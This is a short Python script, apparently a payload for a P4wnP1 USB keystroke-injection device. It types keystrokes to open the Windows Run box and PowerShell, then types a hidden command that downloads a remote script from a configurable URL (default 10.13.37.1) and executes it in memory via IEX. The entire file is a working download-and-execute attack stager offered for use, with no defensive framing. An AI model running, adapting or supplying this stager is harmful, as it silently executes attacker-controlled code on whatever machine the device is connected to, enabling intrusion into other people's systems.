#!/usr/bin/env python3
# HID opens PowerShell and IEX's your URL (you supply the hosted script)
import os, sys, time
P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

URL   = os.getenv("P4WN_STAGE_URL", "http://10.13.37.1/payloads/www/autorun.ps1")
OPTS  = os.getenv("P4WN_STAGE_OPTS", "")  # args your script expects

def main():
    print(f"[*] Stage URL: {URL}")
    win_r(); time.sleep(0.5)
    type_string("powershell\n"); time.sleep(0.8)
    # you host your own script; this wrapper just runs it
    cmd = f"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('{URL}'); main {OPTS}\"\n"
    type_string(cmd)
    print("[*] Triggered stage via IEX.")
    return 0

if __name__ == "__main__":
    sys.exit(main())
